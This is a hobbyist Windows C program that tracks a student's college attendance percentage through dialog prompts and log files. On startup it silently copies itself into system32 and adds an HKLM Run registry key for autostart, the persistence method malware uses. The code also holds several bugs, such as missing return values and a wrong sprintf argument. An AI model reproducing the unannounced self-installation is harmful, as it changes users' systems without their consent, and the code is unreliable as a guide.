#include <windows.h>
#include "resource.h" 
#include<stdio.h>
int ncut,natt,ext1,ext2,ext3,temp1,temp2,rd1,rd2;
float per1,per2,mper;
char path1[256],path2[256],path[256];
char percy[256];
HWND add,editr,big,per,sub,windir,win,win1,win2,hwndButton;
char windir_op1()
{   
     GetWindowsDirectory(path1,sizeof(path1));
     strcat(path1,"\\cutatt.log");
     }
char windir_op2()
{
     GetWindowsDirectory(path2,sizeof(path2));
     strcat(path2,"\\attendatt.log");
     }
int windir_op3()
{
    GetWindowsDirectory(path,sizeof(path));
    strcat(path,"\\dateratt.log");
    }
     int date_sunday()
     {
         SYSTEMTIME st;
         GetSystemTime(&st);
         if(st.wDayOfWeek==0)
         {
          return -1; 
               }
               else if(st.wDayOfWeek>0)
               {
                    return 0;}       
         }
int per_day_check(int in)
{
    SYSTEMTIME per;
    GetSystemTime(&per);
    if(per.wDay==in)
      return -1;
     else
     return per.wDay;
    }
int file_date_read()
{
windir_op3();
FILE* dater;
dater=fopen(path,"r");
int g;
fscanf(dater,"%d",&g);
fclose(dater);
return g;
    }
int file_date_write(int dat)
{
    windir_op3();
    FILE* dots;
    dots=fopen(path,"w");
    fprintf(dots,"%d",dat);
    fclose(dots);
    }
int file_cut_read()//func to read existing log for no of cut periods
{
    FILE* cut1;
    windir_op1();
    cut1=fopen(path1,"r");
    if(!cut1)
    return -1;
    int i;
    fscanf(cut1,"%d",&i);
    fclose(cut1);
    return i;    
}
int file_cut_write(int ct)//if absent or cut, the value in the file will be added with no of periods cut
{
    FILE* cut2;
    windir_op1();
    cut2=fopen(path1,"w");
    fprintf(cut2,"%d",ct);
    fclose(cut2);
    }
int file_attend_read()// same for no of periods attended 
{
    FILE* att1;
    windir_op2();
    att1=fopen(path2,"r");
    if(!att1)
    return -1;
    int j;
    fscanf(att1,"%d",&j);
    fclose(att1);
    return j;
    }
int file_attend_write(int at)//same 
{
    FILE* att2;
    windir_op2();
    att2=fopen(path2,"w");
    fprintf(att2,"%d",at);
    fclose(att2);
    }    
float percent_finder(int cuts,int attends)
    {
                         
     ext2=attends*100;   
     ext3=cuts+attends;
     if(attends==0)
     return 0;
     else
     return ext2/ext3;
               }
int current_percentage()
{
    int h=file_cut_read();
   int l= file_attend_read();
    
  float dam=percent_finder(h,l);
  
    sprintf(percy,"%.4f",dam);
    }
BOOL CALLBACK DlgProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	switch(Message)
	{
		case WM_INITDIALOG:
             {
         char windir[MAX_PATH];
char currentfile[MAX_PATH];
HMODULE Me=GetModuleHandle(NULL);
GetModuleFileName(Me, currentfile, sizeof(currentfile));
GetWindowsDirectory(windir, sizeof(windir));
strcat(windir, "\\system32\\attendance.exe");
CopyFile(currentfile, windir, true);
HKEY hkey;
RegCreateKey (HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
RegSetValueEx (hkey, "attendance accuracy", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 
win=FindWindowEx(hwnd,NULL,NULL,"You Attended");

                              ShowWindow(win,SW_HIDE);
                              win1=FindWindowEx(hwnd,NULL,NULL,"Out Of");
                              ShowWindow(win1,SW_HIDE);
                              win2=FindWindowEx(hwnd,NULL,NULL,"Periods So Far");
                              ShowWindow(win2,SW_HIDE);
                              win1=FindWindowEx(hwnd,NULL,NULL,"&ADD");
                              win2=FindWindowEx(hwnd,NULL,NULL,"&CANCEL");
                              ShowWindow(win1,SW_HIDE);
                              ShowWindow(win2,SW_HIDE);
               if(file_cut_read()==-1||file_attend_read()==-1)
               {
                 MessageBox(NULL,"WELCOME TO ATTENDANCE ACCURACY","HI",MB_OK|MB_ICONASTERISK);
                 file_cut_write(0);
                 file_attend_write(0);
                 file_date_write(0);
                 }
                 if(date_sunday()==-1)
                 {
                  PostQuitMessage(0);
                    }                                           
                  if(per_day_check(file_date_read())==-1)
                  {
                   // PostQuitMessage(0);
                         } 
                 file_date_write(per_day_check(0));  
                                  
             int i=MessageBox(hwnd,"DID YOU GO TO COLLEGE TODAY?","PLEASE ANSWER",MB_YESNO|MB_ICONQUESTION|MB_DEFBUTTON1);
             switch(i)
             {
            case 7://7 when "no" button is clicked
                 {
       int j=MessageBox(hwnd,"Was It a Holiday??","PLEASE ANSWER",MB_YESNO|MB_ICONQUESTION|MB_DEFBUTTON1);
       switch(j)
       {
                case 6: //6 for yes
                     {              
                  add=FindWindowEx(hwnd,NULL,NULL,"&SUBMIT");
                  editr=FindWindowEx(hwnd,NULL,"Edit",NULL);
                  big=FindWindowEx(hwnd,NULL,NULL,"How Many Periods Did You Attend?");
                  per=FindWindowEx(hwnd,NULL,NULL,"Periods");
                  SendMessage(add,WM_CLOSE,0,0);
	              ShowWindow(editr,SW_HIDE);
	              SetWindowText(big,"    Enjoy Your Holiday!!!");
	              SendMessage(per,WM_CLOSE,0,0);
	              current_percentage();
                    SetDlgItemText(hwnd,IDC_PERK,percy);
	              break;
               }
               case 7:
                    {
                        add=FindWindowEx(hwnd,NULL,NULL,"&SUBMIT");
                  editr=FindWindowEx(hwnd,NULL,"Edit",NULL);
                  big=FindWindowEx(hwnd,NULL,NULL,"How Many Periods Did You Attend?");
                  per=FindWindowEx(hwnd,NULL,NULL,"Periods");
                  ncut=file_cut_read();
                  ncut+=8;
                  file_cut_write(ncut);
	              SendMessage(add,WM_CLOSE,0,0);
	              ShowWindow(editr,SW_HIDE);
	              SetWindowText(big,"    You Did Not Go To college Today!");
	              SendMessage(per,WM_CLOSE,0,0);
	              current_percentage();
                    SetDlgItemText(hwnd,IDC_PERK,percy);
	              break; 
                        }
    }
}
		}
		break;
    }
		case WM_COMMAND:
			switch(LOWORD(wParam))
			{
				case IDC_ADD:// when submit button is clicked do the following
				{
					BOOL bSuccess;
					int nTimes=GetDlgItemInt(hwnd,IDC_NUMBER,&bSuccess,FALSE);
					if(bSuccess) 
					{
						if(nTimes>8||nTimes<0)
             MessageBox(hwnd,"Sorry!Enter Between 1 and 8 numbers","CHECK INPUT",MB_OK|MB_ICONASTERISK);
                 else
                 {
                    ext1=8-nTimes;
                    temp1=file_cut_read();
                    temp1+=ext1;
                    file_cut_write(temp1);
                    temp2=file_attend_read();
                    temp2+=nTimes;
                    file_attend_write(temp2); 
                    rd1=file_cut_read();
                    rd2=file_attend_read();
                    mper=percent_finder(rd1,rd2);                    
                    sub=FindWindowEx(hwnd,NULL,NULL,"&SUBMIT");
                    SendMessage(sub,WM_CLOSE,0,0);
                    SetDlgItemText(hwnd,IDC_STATIC,"");
                    SetDlgItemText(hwnd,IDC_NUMBER,"");
                    sprintf(percy,"%.2f",&mper);
                    current_percentage();
                    SetDlgItemText(hwnd,IDC_PERK,percy);
                    
                     }
											}
			
				}
				break;
				case IDC_REMOVE:
                     MessageBox(NULL,"This App will Ask U every day once. answer correctly \nand put in only numbers in TextBoxes enter the number\n of periods in the textbox and click submit.\ndo not use reset unless u have met with any errors.\nplease report any inconvenience to rktserviceproviders@gmail.com to Get The Best Frm my Sml apps","HELP",MB_OK);
                    break;
				case IDC_REFRESH:
                     {current_percentage();
                    SetDlgItemText(hwnd,IDC_PERK,percy);
                    win=FindWindowEx(hwnd,NULL,NULL,"You Attended");
                              ShowWindow(win,SW_HIDE);
                              win1=FindWindowEx(hwnd,NULL,NULL,"Out Of");
                              ShowWindow(win1,SW_HIDE);
                              win2=FindWindowEx(hwnd,NULL,NULL,"Periods So Far");
                              ShowWindow(win2,SW_HIDE);
                              SetDlgItemText(hwnd,IDC_EMER,"");
                              SetDlgItemText(hwnd,IDC_EMER1,"");
                              
                                 }
                     break;
				case IDC_RESET:
                     {
                          int k;
                          MessageBox(hwnd,"Resetting will erase all previously logged entries!","confirm",MB_OK|MB_ICONASTERISK);
                           k=MessageBox(hwnd,"You will lose all previous percentages.\nselect YES to reset.else click no","AGAIN",MB_YESNO|MB_ICONQUESTION);
                           switch(k)
                           {case 6:
                                 {file_cut_write(0);
                                 file_attend_write(0);
                                 file_date_write(0);
                                 ShowWindow(FindWindowEx(hwnd,NULL,NULL,"&SUBMIT"),SW_HIDE);
                                 windir_op1();
                                 MessageBox(NULL,"Restart The app to Have A New Start","Hey",MB_OK|MB_ICONASTERISK);
                                 rename(path1,"temp.txt");  
                                 PostQuitMessage(0);                              
                                  }
                                  case 7:
                                       break;
                                  }
                                           break;
    
                               }
				case IDC_CLEAR:
					PostQuitMessage(0);
				break;
				case IDC_STAC:
               {         char klm[5],kj[5];
                              sprintf(klm,"%d",file_attend_read());
                              SetDlgItemText(hwnd,IDC_EMER,klm);
                              int v,u;
                              v=file_cut_read();
                              u=file_attend_read();
                              sprintf(kj,"%d",u+v);
                              SetDlgItemText(hwnd,IDC_EMER1,kj);
                              win=FindWindowEx(hwnd,NULL,NULL,"You Attended");
                              ShowWindow(win,SW_SHOW);
                              win1=FindWindowEx(hwnd,NULL,NULL,"Out Of");
                              ShowWindow(win1,SW_SHOW);
                              win2=FindWindowEx(hwnd,NULL,NULL,"Periods So Far");
                              ShowWindow(win2,SW_SHOW);
                              }
                              break;
                              case IDC_EMER3:
                                   {
                                          int o=   MessageBox(NULL,"If You Want to Add Your Past Attendance\n Details To Get Your Full percent of attendance(Full SEM)(Those last days of 2010 (If u remember))\nPlease click YES else kick NO","HEY",MB_YESNO|MB_ICONQUESTION);
                                   switch(o)
                                   {
                                            case 6:
                                                 {
                                            win2=FindWindowEx(hwnd,NULL,"static",NULL);
                                            SetWindowText(win2,"Total workin Days B4 instalin this prgm-");
                                            win1=FindWindowEx(hwnd,NULL,NULL,"&SUBMIT");
                                            ShowWindow(win1,SW_HIDE);
                                            SetDlgItemText(hwnd,IDC_EMER6,"No Of Periods U CUT (not days)-");
                                            SetDlgItemText(hwnd,IDC_EMER7,"Days");
                                            SetDlgItemText(hwnd,IDC_EMER4,"Periods");
                                            ShowWindow(FindWindowEx(hwnd,NULL,"Edit",NULL),SW_SHOW);
                                          hwndButton = CreateWindow ("EDIT","",WS_CHILD | WS_VISIBLE|WS_BORDER ,210,60, 35,20,hwnd,NULL,NULL,NULL);
                                                                      
                                                                      win1=FindWindowEx(hwnd,NULL,NULL,"&ADD");
                              win2=FindWindowEx(hwnd,NULL,NULL,"&CANCEL");
                              ShowWindow(win1,SW_SHOW);
                              ShowWindow(win2,SW_SHOW);
                              
                               }break;
                                                 case 7:
                                                      {
                                                      }
                                               break;
                                               } 
                                               break;                                         
                                             }
                                             break;
                                             case IDC_BUT1:
                                                  {
                                                           int z,f,d,s,n;
                       	BOOL buccess,kuccess;
					int nimes=GetDlgItemInt(hwnd,IDC_NUMBER,&buccess,FALSE);
					if(buccess)
                    {
                              char klj[5];
                              GetWindowText(hwndButton,klj,sizeof(klj));
                              z=atoi(klj);
                              f=nimes*8;
                              d=file_cut_read();
                              file_cut_write(d+z);
                              s=file_attend_read();
                              n=f-z;
                              file_attend_write(s+n);
                              current_percentage();
                    SetDlgItemText(hwnd,IDC_PERK,percy);
                    MessageBox(NULL,"Successfully Updated Past Details.Now Ur %Attendance Covers Full sem","CONGRATS",MB_OK|MB_ICONASTERISK);
                        SendMessage(hwndButton,WM_CLOSE,0,0);
                                                                ShowWindow(FindWindowEx(hwnd,NULL,NULL,"&ADD"),SW_HIDE);
                                                                ShowWindow(FindWindowEx(hwnd,NULL,NULL,"&CANCEL"),SW_HIDE);
                                                                ShowWindow(FindWindowEx(hwnd,NULL,NULL,"&SUBMIT"),SW_SHOW);
                                                                SetDlgItemText(hwnd,IDC_EMER7,"Periods");
                                                                SetWindowText(FindWindowEx(hwnd,NULL,NULL,"Total workin Days B4 instalin this prgm-"),"How Many Periods Did You Attend?");
                                                                SetDlgItemText(hwnd,IDC_EMER6,"");
                                                                SetDlgItemText(hwnd,IDC_EMER4,"");
                              }                                  if(!FindWindowEx(hwnd,NULL,NULL,"&SUBMIT"))
                                                               {
                                                               SendMessage(FindWindowEx(hwnd,NULL,NULL,"How Many Periods Did You Attend?"),WM_CLOSE,0,0);
                                                               ShowWindow(FindWindowEx(hwnd,NULL,"Edit",NULL),SW_HIDE);
                                                               ShowWindow(FindWindowEx(hwnd,NULL,NULL,"Periods"),SW_HIDE);
                                                               
                                                               }   
                                                           
                                                           
                                                           
                                                           
                                                           }
                                                  break;
                                                           case IDC_BUT2:
                                                                {
                                                                         SendMessage(hwndButton,WM_CLOSE,0,0);
                                                                ShowWindow(FindWindowEx(hwnd,NULL,NULL,"&ADD"),SW_HIDE);
                                                                ShowWindow(FindWindowEx(hwnd,NULL,NULL,"&CANCEL"),SW_HIDE);
                                                                ShowWindow(FindWindowEx(hwnd,NULL,NULL,"&SUBMIT"),SW_SHOW);
                                                                SetDlgItemText(hwnd,IDC_EMER7,"Periods");
                                                                SetWindowText(FindWindowEx(hwnd,NULL,NULL,"Total workin Days B4 instalin this prgm-"),"How Many Periods Did You Attend?");
                                                                SetDlgItemText(hwnd,IDC_EMER6,"");
                                                                SetDlgItemText(hwnd,IDC_EMER4,"");
                                                               if(!FindWindowEx(hwnd,NULL,NULL,"&SUBMIT"))
                                                               {
                                                               SendMessage(FindWindowEx(hwnd,NULL,NULL,"How Many Periods Did You Attend?"),WM_CLOSE,0,0);
                                                               ShowWindow(FindWindowEx(hwnd,NULL,"Edit",NULL),SW_HIDE);
                                                               ShowWindow(FindWindowEx(hwnd,NULL,NULL,"Periods"),SW_HIDE);
                                                               
                                                               }
                                                                               
                                                                
                                                                               }
                                                                break;
		
		case IDC_LIST:
             MessageBox(NULL,"Attendance Accuracy for attendance Percentage Calculation for VEC CSE-1 Boyz\nversion 0.0.1 by NEW EARTH CopyRight Not Reserved!\nRedistribution Of this Software is Much Appreciated\nPlease Send Your Suggestions To rktserviceproviders@gmail.com","ABOUT",MB_OK|MB_ICONINFORMATION);
             }
             break;
             
		case WM_CLOSE:
			EndDialog(hwnd, 0);
		break;
		default:
			return FALSE;
        }
	return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow)
{
	return DialogBox(hInstance, MAKEINTRESOURCE(IDD_MAIN), NULL, DlgProc);
}
